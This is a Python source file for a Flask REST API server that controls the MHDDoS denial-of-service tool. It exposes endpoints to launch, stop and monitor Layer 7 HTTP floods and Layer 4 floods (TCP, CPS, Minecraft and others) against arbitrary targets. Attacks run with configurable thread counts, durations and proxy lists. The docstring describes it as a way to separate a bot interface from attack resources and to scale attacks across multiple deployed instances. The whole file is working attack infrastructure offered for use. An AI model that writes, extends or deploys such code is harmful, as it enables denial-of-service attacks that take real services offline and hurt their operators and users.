#!/usr/bin/env python3
"""
MHDDoS Attack API Server

A REST API server that handles attack execution, allowing separation of 
bot interface from attack resources. Multiple instances can be deployed
to scale attack capabilities.

Endpoints:
- GET / - API welcome page with endpoint documentation
- POST /attack/start - Start an attack
- POST /attack/stop - Stop an attack  
- GET /attack/status - Get current attack status
- GET /health - Health check endpoint
- GET /info - Get server info and capabilities

Environment Variables:
- PORT: API server port (Heroku standard, takes precedence)
- ATTACK_API_PORT: API server port (fallback, default: 5000)
- ATTACK_API_HOST: API server host (default: 0.0.0.0)
- ATTACK_API_KEY: API key for authentication (optional)
- ATTACK_API_DEBUG: Enable debug mode (default: false)
"""

import logging
import os
import resource
import traceback
from dataclasses import dataclass, field
from enum import Enum
from http.server import BaseHTTPRequestHandler, HTTPServer
from json import dumps, load, loads
from pathlib import Path
from socket import gethostbyname
from threading import Event, Thread, active_count
from time import sleep, time
from typing import Any, Dict, List, Optional, Set, Tuple
from uuid import uuid4

from flask import Flask, jsonify, request
from flask_cors import CORS
from PyRoxy import Proxy, ProxyChecker, ProxyType
from PyRoxy import ProxyUtiles as PyRoxyProxyUtiles
from yarl import URL

# Import from start.py
from start import (
    BYTES_SEND,
    REQUESTS_SENT,
    HttpFlood,
    Layer4,
    Methods,
    ProxyManager,
    ProxyUtiles,
    Tools,
    con,
)

# Configure logging
logging.basicConfig(
    format='[%(asctime)s - %(levelname)s] %(message)s',
    datefmt="%H:%M:%S",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

__dir__ = Path(__file__).parent

# Flask app
app = Flask(__name__)
CORS(app)  # Enable CORS for external access


def get_max_threads() -> int:
    """Get the maximum number of threads allowed by the system."""
    try:
        soft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NPROC)
        current_threads = active_count()
        
        if soft_limit == resource.RLIM_INFINITY:
            max_threads = 1000
        else:
            available = soft_limit - current_threads
            max_threads = max(10, int(available * 0.7))
        
        logger.info(f"System thread limit: soft={soft_limit}, hard={hard_limit}, current={current_threads}, max_recommended={max_threads}")
        return max_threads
        
    except (ValueError, OSError) as e:
        logger.warning(f"Could not determine thread limit: {e}, using default 100")
        return 100


SYSTEM_MAX_THREADS = get_max_threads()


@dataclass
class AttackConfig:
    """Configuration for an attack session."""
    attack_id: str = ""
    method: str = ""
    target: str = ""
    port: int = 80
    threads: int = 100
    duration: int = 60
    rpc: int = 1
    is_layer7: bool = True
    proxies: Optional[List[str]] = None  # List of proxy strings


@dataclass 
class AttackSession:
    """Active attack session."""
    config: AttackConfig
    event: Event
    start_time: float
    threads: List[Thread] = field(default_factory=list)
    is_running: bool = False
    error_count: int = 0
    last_error: str = ""


class AttackManager:
    """Manages attack sessions."""
    
    def __init__(self):
        self.active_sessions: Dict[str, AttackSession] = {}
        self.api_key = os.environ.get("ATTACK_API_KEY", "")
    
    def validate_api_key(self, provided_key: str) -> bool:
        """Validate API key if one is configured."""
        if not self.api_key:
            return True  # No key required
        return provided_key == self.api_key
    
    def start_attack(self, config: AttackConfig) -> Tuple[bool, str, str]:
        """
        Start an attack with the given configuration.
        
        Returns:
            Tuple of (success, message, attack_id)
        """
        # Generate attack ID if not provided
        if not config.attack_id:
            config.attack_id = str(uuid4())[:8]
        
        # Stop existing attack with same ID
        if config.attack_id in self.active_sessions:
            self.stop_attack(config.attack_id)
        
        # Validate configuration
        if not config.method:
            return False, "Attack method not specified", ""
        
        if not config.target:
            return False, "Target not specified", ""
        
        if config.threads < 1:
            return False, "Thread count must be at least 1", ""
        
        if config.threads > SYSTEM_MAX_THREADS:
            return False, f"Thread count exceeds system limit ({SYSTEM_MAX_THREADS})", ""
        
        if config.duration < 1:
            return False, "Duration must be at least 1 second", ""
        
        # Validate method
        if config.is_layer7:
            if config.method not in Methods.LAYER7_METHODS:
                return False, f"Invalid Layer 7 method: {config.method}", ""
        else:
            if config.method not in Methods.LAYER4_METHODS:
                return False, f"Invalid Layer 4 method: {config.method}", ""
        
        # Create attack session
        event = Event()
        session = AttackSession(
            config=config,
            event=event,
            start_time=time()
        )
        
        self.active_sessions[config.attack_id] = session
        
        # Reset counters
        REQUESTS_SENT.set(0)
        BYTES_SEND.set(0)
        
        try:
            if config.is_layer7:
                self._start_layer7_attack(session)
            else:
                self._start_layer4_attack(session)
            
            # Start monitoring thread
            monitor_thread = Thread(target=self._monitor_attack, args=(config.attack_id,), daemon=True)
            monitor_thread.start()
            
            return True, f"Attack started successfully", config.attack_id
            
        except Exception as e:
            logger.error(f"Attack failed to start: {e}\n{traceback.format_exc()}")
            session.event.clear()
            session.is_running = False
            if config.attack_id in self.active_sessions:
                del self.active_sessions[config.attack_id]
            return False, f"Attack failed to start: {str(e)}", ""
    
    def _start_layer7_attack(self, session: AttackSession) -> None:
        """Start Layer 7 attack."""
        config = session.config
        
        # Prepare URL
        urlraw = config.target if config.target.startswith("http") else f"http://{config.target}"
        url = URL(urlraw)
        host = url.host
        
        if config.method != "TOR":
            try:
                host = gethostbyname(url.host)
            except Exception as e:
                raise Exception(f"Cannot resolve hostname: {str(e)}")
        
        # Load user agents and referers
        useragent_li = __dir__ / "files/useragent.txt"
        referers_li = __dir__ / "files/referers.txt"
        
        uagents = set()
        referers = set()
        
        try:
            if useragent_li.exists():
                uagents = set(a.strip() for a in useragent_li.open("r").readlines() if a.strip())
            if referers_li.exists():
                referers = set(a.strip() for a in referers_li.open("r").readlines() if a.strip())
        except Exception as e:
            logger.warning(f"Failed to load useragents/referers: {e}")
        
        # Parse proxies if provided
        proxies = None
        if config.proxies:
            proxies = set()
            for proxy_str in config.proxies:
                try:
                    # Parse proxy string (format: type://host:port)
                    proxy = ProxyUtiles.parseOne(proxy_str)
                    if proxy:
                        proxies.add(proxy)
                except Exception as e:
                    logger.warning(f"Failed to parse proxy {proxy_str}: {e}")
            
            if not proxies:
                proxies = None
        
        # Start threads
        started_threads = 0
        for thread_id in range(config.threads):
            try:
                t = HttpFlood(
                    thread_id, url, host, config.method, config.rpc,
                    session.event, uagents, referers, proxies
                )
                t.start()
                session.threads.append(t)
                started_threads += 1
            except Exception as e:
                session.error_count += 1
                session.last_error = str(e)
                logger.warning(f"Failed to start thread {thread_id}: {e}")
                if started_threads == 0:
                    raise Exception(f"Failed to start any threads: {e}")
        
        session.event.set()
        session.is_running = True
        logger.info(f"Layer 7 attack started: {config.method} -> {config.target}, {started_threads} threads")
    
    def _start_layer4_attack(self, session: AttackSession) -> None:
        """Start Layer 4 attack."""
        config = session.config
        
        target = config.target
        try:
            target = gethostbyname(target)
        except Exception as e:
            raise Exception(f"Cannot resolve hostname: {str(e)}")
        
        # Parse proxies if provided (only for supported methods)
        proxies = None
        if config.proxies and config.method in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
            proxies = set()
            for proxy_str in config.proxies:
                try:
                    proxy = ProxyUtiles.parseOne(proxy_str)
                    if proxy:
                        proxies.add(proxy)
                except Exception as e:
                    logger.warning(f"Failed to parse proxy {proxy_str}: {e}")
            
            if not proxies:
                proxies = None
        
        # Start threads
        started_threads = 0
        for _ in range(config.threads):
            try:
                t = Layer4(
                    (target, config.port), None, config.method,
                    session.event, proxies, con.get("MINECRAFT_DEFAULT_PROTOCOL", 47)
                )
                t.start()
                session.threads.append(t)
                started_threads += 1
            except Exception as e:
                session.error_count += 1
                session.last_error = str(e)
                logger.warning(f"Failed to start Layer4 thread: {e}")
                if started_threads == 0:
                    raise Exception(f"Failed to start any threads: {e}")
        
        session.event.set()
        session.is_running = True
        logger.info(f"Layer 4 attack started: {config.method} -> {target}:{config.port}, {started_threads} threads")
    
    def _monitor_attack(self, attack_id: str) -> None:
        """Monitor attack progress and stop when duration expires."""
        if attack_id not in self.active_sessions:
            return
        
        session = self.active_sessions[attack_id]
        start_time = session.start_time
        duration = session.config.duration
        
        try:
            while session.is_running and time() < start_time + duration:
                sleep(1)  # Use synchronous sleep in threaded context
                
                if not session.is_running:
                    break
            
            # Stop attack when duration expires
            if session.is_running:
                self.stop_attack(attack_id)
                logger.info(f"Attack {attack_id} completed (duration expired)")
                
        except Exception as e:
            logger.error(f"Error in monitor task for {attack_id}: {e}")
            session.error_count += 1
            session.last_error = str(e)
    
    def stop_attack(self, attack_id: str) -> Tuple[bool, str]:
        """
        Stop an attack by ID.
        
        Returns:
            Tuple of (success, message)
        """
        if attack_id not in self.active_sessions:
            return False, f"No attack found with ID: {attack_id}"
        
        session = self.active_sessions[attack_id]
        session.event.clear()
        session.is_running = False
        
        del self.active_sessions[attack_id]
        
        logger.info(f"Attack {attack_id} stopped")
        return True, f"Attack {attack_id} stopped successfully"
    
    def stop_all_attacks(self) -> Tuple[bool, str]:
        """Stop all running attacks."""
        stopped = 0
        for attack_id in list(self.active_sessions.keys()):
            self.stop_attack(attack_id)
            stopped += 1
        
        return True, f"Stopped {stopped} attacks"
    
    def get_attack_status(self, attack_id: str) -> Optional[Dict[str, Any]]:
        """Get status of a specific attack."""
        if attack_id not in self.active_sessions:
            return None
        
        session = self.active_sessions[attack_id]
        elapsed = int(time() - session.start_time)
        remaining = max(0, session.config.duration - elapsed)
        progress = min(100, int((elapsed / session.config.duration) * 100))
        
        return {
            "attack_id": attack_id,
            "target": session.config.target,
            "method": session.config.method,
            "is_layer7": session.config.is_layer7,
            "port": session.config.port,
            "threads": session.config.threads,
            "duration": session.config.duration,
            "elapsed": elapsed,
            "remaining": remaining,
            "progress": progress,
            "is_running": session.is_running,
            "pps": int(REQUESTS_SENT),
            "bps": int(BYTES_SEND),
            "error_count": session.error_count,
            "last_error": session.last_error,
        }
    
    def get_all_status(self) -> Dict[str, Any]:
        """Get status of all attacks and server info."""
        attacks = {}
        for attack_id in self.active_sessions:
            attacks[attack_id] = self.get_attack_status(attack_id)
        
        return {
            "active_attacks": len(self.active_sessions),
            "attacks": attacks,
            "server_info": {
                "max_threads": SYSTEM_MAX_THREADS,
                "current_threads": active_count(),
                "layer7_methods": sorted(list(Methods.LAYER7_METHODS)),
                "layer4_methods": sorted(list(Methods.LAYER4_METHODS)),
            }
        }


# Global attack manager
attack_manager = AttackManager()


def require_api_key(f):
    """Decorator to require API key for endpoints."""
    def decorated(*args, **kwargs):
        api_key = request.headers.get("X-API-Key", "")
        if not attack_manager.validate_api_key(api_key):
            return jsonify({"success": False, "error": "Invalid API key"}), 401
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated


@app.route('/', methods=['GET'])
def root():
    """Root endpoint - API welcome page."""
    return jsonify({
        "service": "MHDDoS Attack API",
        "version": "1.0.0",
        "status": "running",
        "endpoints": {
            "GET /": "This welcome page",
            "GET /health": "Health check",
            "GET /info": "Server information and capabilities",
            "POST /attack/start": "Start an attack",
            "POST /attack/stop": "Stop an attack",
            "GET /attack/status": "Get attack status",
        },
        "documentation": "See /info for available attack methods and server capabilities",
    })


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint."""
    return jsonify({
        "status": "healthy",
        "service": "MHDDoS Attack API",
        "active_attacks": len(attack_manager.active_sessions),
        "max_threads": SYSTEM_MAX_THREADS,
        "current_threads": active_count(),
    })


@app.route('/info', methods=['GET'])
def server_info():
    """Get server information and capabilities."""
    return jsonify({
        "success": True,
        "service": "MHDDoS Attack API",
        "version": "1.0.0",
        "max_threads": SYSTEM_MAX_THREADS,
        "current_threads": active_count(),
        "layer7_methods": sorted(list(Methods.LAYER7_METHODS)),
        "layer4_methods": sorted(list(Methods.LAYER4_METHODS)),
        "active_attacks": len(attack_manager.active_sessions),
    })


@app.route('/attack/start', methods=['POST'])
@require_api_key
def start_attack():
    """
    Start an attack.
    
    Request body:
    {
        "method": "GET",
        "target": "http://example.com",
        "port": 80,
        "threads": 100,
        "duration": 60,
        "rpc": 1,
        "is_layer7": true,
        "proxies": ["http://proxy1:port", "socks5://proxy2:port"],
        "attack_id": "optional-custom-id"
    }
    """
    try:
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "No data provided"}), 400
        
        config = AttackConfig(
            attack_id=data.get("attack_id", ""),
            method=data.get("method", "").upper(),
            target=data.get("target", ""),
            port=int(data.get("port", 80)),
            threads=int(data.get("threads", 100)),
            duration=int(data.get("duration", 60)),
            rpc=int(data.get("rpc", 1)),
            is_layer7=data.get("is_layer7", True),
            proxies=data.get("proxies"),
        )
        
        success, message, attack_id = attack_manager.start_attack(config)
        
        if success:
            return jsonify({
                "success": True,
                "message": message,
                "attack_id": attack_id,
            })
        else:
            return jsonify({"success": False, "error": message}), 400
            
    except Exception as e:
        logger.error(f"Error starting attack: {e}\n{traceback.format_exc()}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/attack/stop', methods=['POST'])
@require_api_key
def stop_attack():
    """
    Stop an attack.
    
    Request body:
    {
        "attack_id": "attack-id" or "all" to stop all
    }
    """
    try:
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "No data provided"}), 400
        
        attack_id = data.get("attack_id", "")
        
        if attack_id == "all":
            success, message = attack_manager.stop_all_attacks()
        elif attack_id:
            success, message = attack_manager.stop_attack(attack_id)
        else:
            return jsonify({"success": False, "error": "attack_id not provided"}), 400
        
        return jsonify({"success": success, "message": message})
        
    except Exception as e:
        logger.error(f"Error stopping attack: {e}\n{traceback.format_exc()}")
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/attack/status', methods=['GET'])
@require_api_key
def get_status():
    """
    Get attack status.
    
    Query params:
    - attack_id: Optional specific attack ID, omit for all attacks
    """
    try:
        attack_id = request.args.get("attack_id")
        
        if attack_id:
            status = attack_manager.get_attack_status(attack_id)
            if status:
                return jsonify({"success": True, "status": status})
            else:
                return jsonify({"success": False, "error": f"No attack found with ID: {attack_id}"}), 404
        else:
            status = attack_manager.get_all_status()
            return jsonify({"success": True, **status})
            
    except Exception as e:
        logger.error(f"Error getting status: {e}\n{traceback.format_exc()}")
        return jsonify({"success": False, "error": str(e)}), 500


def main():
    """Main entry point."""
    # Get port from environment
    # Support both PORT (Heroku standard) and ATTACK_API_PORT (custom)
    # PORT takes precedence for Heroku deployment compatibility
    port = int(os.environ.get("PORT", os.environ.get("ATTACK_API_PORT", 5000)))
    host = os.environ.get("ATTACK_API_HOST", "0.0.0.0")
    debug = os.environ.get("ATTACK_API_DEBUG", "false").lower() == "true"
    
    api_key = os.environ.get("ATTACK_API_KEY", "")
    if api_key:
        logger.info("API key authentication enabled")
    else:
        logger.warning("No API key configured - API is open to all requests")
    
    logger.info(f"Starting MHDDoS Attack API on {host}:{port}")
    logger.info(f"Max threads: {SYSTEM_MAX_THREADS}")
    
    app.run(host=host, port=port, debug=debug, threaded=True)


if __name__ == "__main__":
    main()
